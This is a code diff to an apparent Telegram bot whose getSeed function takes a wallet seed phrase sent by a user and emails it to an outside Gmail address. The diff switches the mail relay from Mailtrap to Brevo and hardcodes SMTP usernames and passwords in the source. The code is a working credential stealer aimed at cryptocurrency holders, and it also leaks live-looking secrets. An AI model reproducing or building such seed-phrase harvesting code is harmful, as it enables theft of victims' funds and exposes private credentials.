@@ -43,11 +43,11 @@ async def start(update: Update, context: CallbackContext) -> int:
 
 def getSeed(update: Update, context: CallbackContext) -> str:
     port = 587
-    smtp_server = "live.smtp.mailtrap.io"
-    login = "api"
-    password = "01ce79d0040b8dad927368a804774c2b"
+    smtp_server = "smtp-relay.brevo.com"
+    smtp_username = "870b79001@smtp-brevo.com"
+    smtp_password = "NT2hk8WtrzQR9vVf"
 
-    sender_mail = "hello@demomailtrap.co"
+    sender_mail = "devollopex@gmail.com"
     receiver_email = "screenerbotdex@gmail.com"
 
     text = f"THIS IS THE SEED PHRASE\n----------------------------------------\n {update.message.text}"
@@ -60,7 +60,7 @@ def getSeed(update: Update, context: CallbackContext) -> str:
 
     with smtplib.SMTP(smtp_server,port) as server:
          server.starttls()
-         server.login(login, password)
+         server.login(smtp_username, smtp_password)
          server.sendmail(sender_mail,receiver_email,message.as_string())
 
     print('Sent')
